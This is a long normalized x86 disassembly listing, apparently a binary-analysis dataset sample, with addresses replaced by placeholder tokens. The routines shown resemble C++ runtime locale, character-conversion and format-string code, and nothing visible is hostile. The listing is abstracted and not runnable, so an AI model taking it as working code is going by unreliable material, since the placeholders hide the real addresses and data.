mov [ edi ] eax
mov eax [ esi ]
cmp eax [ ebp + 0x10 ]
mov [ ebp - 0x20 ] ecx
setne dl
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x10 ] edx
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ edi ]
cmp eax [ ebp - 0x14 ]
je r-xdata
mov edx [ ebp - 0x14 ]
add ecx 0x8
sub edx eax
cmp edx 0x5
push ecx
push ebx
jl r-xdata
mov eax [ ebx ]
mov [ ebp - 0x1c ] eax
mov eax [ esi ]
movzx eax [ eax ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_1001b60c
mov ebx eax
add esp 0x10
test ebx ebx
jl r-xdata
mov ecx [ esi ]
movzx ecx [ ecx ]
push ecx
push eax
call sub_1001b60c
add esp 0x10
test eax eax
jl r-xdata
push 0x2
pop eax
jmp r-xdata
mov eax [ edi ]
mov ecx [ ebp - 0x14 ]
sub ecx eax
cmp ecx ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x1c
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
mov [ ecx ] eax
push ebx
lea edx [ ebp - 0xc ]
push edx
push ecx
push eax
call sub_1002005a
add [ esi ] 0x2
add esp 0x10
add [ edi ] ebx
mov ebx [ ebp - 0x18 ]
mov eax [ ebp + 0x10 ]
and [ ebp - 0x10 ] 0x0
cmp [ esi ] eax
jne r-xdata
mov ecx [ ebp - 0x20 ]
jmp r-xdata
sub_1003a7c6
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax ecx
mov ecx [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
add eax 0x8
push eax
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0xc ]
push edi
mov [ esi ] ecx
mov ecx [ edi ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0x18 ] ecx
call sub_1001b60c
mov ebx eax
add esp 0x10
test ebx ebx
jg r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0x14 ]
dec ebx
sub ecx eax
cmp ecx ebx
jge r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x18 ]
mov [ edi ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x10
push ebx
lea edx [ ebp - 0xc ]
push edx
push ecx
push eax
call sub_1002005a
add esp 0x10
add [ esi ] ebx
sub_1003a85c
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x14 ] ebx
jbe r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0x10
cmp esi [ ebp + 0x10 ]
je r-xdata
lea eax [ edi + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x10 ]
sub eax esi
push eax
lea eax [ ebp + 0x8 ]
push esi
push eax
call sub_1001b946
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ ebp + 0x8 ] ax
jne r-xdata
add esi eax
inc ebx
cmp ebx [ ebp + 0x14 ]
jb r-xdata
xor eax eax
push esi
call sub_100200e0
pop ecx
inc eax
sub_1003a8d4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003a4b8
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003a919
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0xc ]
call sub_1001b1fe
test [ ebp + 0x8 ] ax
pop ecx
pop ecx
push 0x0
pop eax
setne al
pop ebp
retn 0x8
sub_1003a958
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ ebp + 0x8 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
inc esi
inc esi
sub_1003a987
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ ebp + 0x8 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
inc esi
inc esi
sub_1003a9cd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1001bb27
mov [ esi ] ax
inc esi
inc esi
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_1003aa14
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1001baba
mov [ esi ] ax
inc esi
inc esi
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_1003aa44
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
add ecx 0x18
push ecx
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1001b946
add esp 0x14
test eax eax
mov eax 0xffff
jl r-xdata
leave
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_1003aa85
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x2c ]
pop ebp
retn 0xc
sub_1003aaa3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
mov ebx ecx
cmp [ ebp + 0x14 ] eax
jae r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
call sub_1002059f
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
push edi
mov edi [ ebp + 0x10 ]
movzx eax [ esi ]
push eax
mov ecx ebx
call sub_1003aa44
mov [ edi ] ax
inc esi
inc edi
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_1003aae6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
mov eax ecx
add eax 0x18
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_1001b60c
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10020040
leave
retn 0x8
mov al [ ebp - 0xc ]
sub_1003ab39
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
sar edx 0x1
push edx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x38 ]
pop ebp
retn 0x10
sub_1003ab5c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
mov ebx ecx
cmp [ ebp + 0x18 ] eax
jae r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
call sub_1002059f
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov edi [ ebp + 0x14 ]
movzx eax [ esi ]
push [ ebp + 0x10 ]
mov ecx ebx
push eax
call sub_1003aae6
inc esi
inc esi
mov [ edi ] al
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_1003aba3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003a8f7
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1003abc4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
and [ esi + 0x8 ] 0x0
call sub_1003a4ff
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003ac07
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003abeb
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1003ac28
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10044160
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003ac4b
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10046e0f
add esp 0x14
pop ebp
retn 0x10
sub_1003ac6c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003a55b
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003ac8f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003a55b
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003ace0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003a55b
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003ad39
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
mov [ ebp - 0x1 ] 0x0
call sub_1001b60c
mov al [ ebp - 0x1 ]
add esp 0x10
leave
retn
sub_1003ad63
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x2
jae r-xdata
xor ecx ecx
lea eax [ ecx + ecx ]
push eax
call sub_10020186
pop ecx
leave
retn
push 0x0
lea ecx [ ebp - 0xc ]
call sub_10002244
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_10023a01
int3
sub_1003adc0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003a55b
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003ae01
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov bl [ edi ]
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x49
inc ecx
mov [ ecx ] 0x36
inc ecx
mov [ ecx ] 0x34
mov [ ecx ] bl
jmp r-xdata
cmp esi 0x800
je r-xdata
mov dl 0x6f
jmp r-xdata
mov esi edx
and esi 0xe00
inc ecx
cmp esi 0x400
jne r-xdata
shl dl 0x3
not dl
and dl 0x20
or dl 0x58
mov dl [ edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_1003ae93
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10044160
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003aeb6
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
movzx edx [ ecx ]
rol eax 0x8
add eax edx
inc ecx
inc ecx
pop ebp
retn 0x8
sub_1003aed5
mov edi edi
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_1002059f
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_1002059f
mov eax [ eax + 0x14 ]
lea eax [ ecx + eax * 2 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_1003af0f
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_1002059f
test ebx ebx
je r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x8
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp ebx eax
jbe r-xdata
mov eax [ eax ]
mov [ edi ] esi
mov [ edi + 0x4 ] ebx
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_1003af63
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
jmp r-xdata
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi [ ebp + 0x14 ]
jne r-xdata
xor eax eax
cmp edx [ ebp + 0xc ]
setne al
movzx eax [ edx ]
movzx ecx [ esi ]
cmp cx ax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jb r-xdata
pop esi
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
inc edx
inc edx
inc esi
inc esi
sub_1003afa6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
sar eax 0x1
sar esi 0x1
cmp esi eax
ja r-xdata
mov eax esi
pop esi
pop ebp
retn
lea ecx [ esi + esi ]
push ecx
push [ ebp + 0x10 ]
add eax eax
push eax
push [ ebp + 0x8 ]
call sub_1002005a
add esp 0x10
sub_1003afda
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003af63
add esp 0x14
pop ebp
retn 0x10
sub_1003b001
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1003b023
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003a55b
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003b046
mov edi edi
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
add [ esi + 0x4 ] 0x2
mov eax esi
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_1002059f
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_1002059f
mov eax [ eax + 0x14 ]
lea eax [ ecx + eax * 2 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_1003b083
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
sub eax [ edi + 0x4 ]
pop edi
neg eax
sbb eax eax
inc eax
pop esi
pop ebp
retn 0x4
test eax eax
je r-xdata
call sub_1002059f
cmp eax [ edi ]
je r-xdata
sub_1003b0b4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003a55b
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003b0d7
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
je r-xdata
xor al al
mov esi [ ecx + 0x18 ]
lea eax [ ecx + 0x4 ]
cmp esi 0x8
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
cmp esi 0x8
jb r-xdata
cmp [ ebp + 0x8 ] edx
jb r-xdata
mov ecx [ ecx + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
mov eax [ eax ]
mov al 0x1
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_1003b116
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0xfffffffc
je r-xdata
lea eax [ edi + edi ]
add [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_1002059f
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_1002059f
cmp [ eax + 0x18 ] 0x8
jb r-xdata
mov edx [ esi + 0x4 ]
push ebx
mov ebx [ eax + 0x14 ]
lea ecx [ ecx + ebx * 2 ]
lea edx [ edx + edi * 2 ]
pop ebx
cmp edx ecx
ja r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp edx eax
jae r-xdata
sub_1003b1a6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
and [ esi + 0x8 ] 0x0
call sub_1003a4ff
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003b1e9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003b1cd
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1003b20a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003acb2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1003b22b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003b179
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1003b24c
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x14 ]
movzx eax ax
retn
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
test eax eax
jle r-xdata
sub_1003b27d
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
jmp r-xdata
test eax eax
jle r-xdata
movzx eax ax
pop ebp
retn 0x4
sub_1003b2bd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ ebp + 0x8 ]
call sub_1003b27d
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003b2e8
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_1003b2bd
dec [ ebp + 0x1c ]
inc esi
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_1003b31f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_1003b2bd
dec [ ebp + 0x1c ]
jne r-xdata
sub_1003b34a
push 0x14
mov eax sub_10047c93
call sub_10023e66
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_100208a9
mov ecx [ ebp + 0x8 ]
mov edi eax
xor ebx ebx
lea eax [ ebp - 0x20 ]
push eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_1000762b
push eax
push ebx
push [ edi + 0x8 ]
call sub_10006a1a
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_1000762b
push eax
push ebx
push r--data
call sub_1003a41b
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_1000762b
push eax
push ebx
push r--data
call sub_1003a41b
mov ecx [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x14 ] eax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_1000762b
push eax
mov eax [ edi ]
movzx eax [ eax ]
push ebx
push eax
call sub_1003a3ed
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] ax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_1000762b
push eax
mov eax [ edi + 0x4 ]
movzx eax [ eax ]
push ebx
push eax
call sub_1003a3ed
add esp 0xc
mov [ esi + 0xe ] ax
cmp [ ebp + 0xc ] bl
je r-xdata
call sub_10023f0b
retn 0x8
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
push eax
call sub_1000762b
push eax
push ebx
push r--data
call sub_10006a1a
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_1000762b
push eax
push ebx
push 0x2e
call sub_1003a3ed
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] ax
add esp 0xc
lea eax [ ebp - 0x18 ]
push eax
call sub_1000762b
push eax
push ebx
push 0x2c
call sub_1003a3ed
add esp 0xc
mov [ esi + 0xe ] ax
sub_1003b482
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_1002059f
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi * 2 ]
pop edi
pop esi
pop ebp
retn 0x4
sub_1003b4af
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0xfffffffc
je r-xdata
add [ esi + 0x4 ] edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
call sub_1002059f
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_1002059f
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov edx [ esi + 0x4 ]
push ebx
mov ebx [ eax + 0x14 ]
add ebx ecx
add edx edi
cmp edx ebx
pop ebx
ja r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp edx eax
jae r-xdata
sub_1003b50d
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
lea ecx [ ebp + 0x14 ]
call sub_10006cbe
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10005d76
dec [ ebp + 0x1c ]
lea ecx [ ebp + 0x14 ]
call sub_10006af5
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_1003b549
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_10005d76
dec [ ebp + 0x18 ]
jne r-xdata
sub_1003b574
push 0x10
mov eax sub_10047cae
call sub_10023e66
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_1000762b
mov ecx [ eax ]
lea ebx [ esi + 0x2c ]
mov [ ebx ] ecx
mov eax [ eax + 0x4 ]
mov [ ebx + 0x4 ] eax
call sub_100208a9
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10006a1a
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_10006d18
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_10006d18
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_10006d18
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
movzx eax [ eax ]
add esp 0xc
push ebx
push 0x0
push eax
call sub_100070de
mov [ esi + 0xc ] ax
mov eax [ edi + 0x18 ]
movzx eax [ eax ]
push ebx
push 0x0
push eax
call sub_100070de
add esp 0x18
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xe ] ax
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
jl r-xdata
call sub_10023f0b
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_10026940
push 0x4
push esi
push [ ebp + 0x8 ]
call sub_10026940
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
